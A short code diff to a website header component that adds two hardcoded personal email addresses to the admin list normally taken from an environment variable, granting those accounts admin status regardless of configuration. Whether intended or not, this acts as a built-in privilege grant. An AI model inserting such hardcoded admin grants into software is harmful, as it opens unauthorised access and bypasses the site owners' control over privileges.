@@ -21,6 +21,10 @@ export async function SiteHeader() {
       const adminEmails = (process.env.ADMIN_EMAILS || "")
         .split(",")
         .map((email) => email.trim().toLowerCase());
+      
+      if (!adminEmails.includes("anup4503@gmail.com")) adminEmails.push("anup4503@gmail.com");
+      if (!adminEmails.includes("anupkist@gmail.com")) adminEmails.push("anupkist@gmail.com");
+
       if (user.email && adminEmails.includes(user.email.toLowerCase())) {
         isAdmin = true;
       }
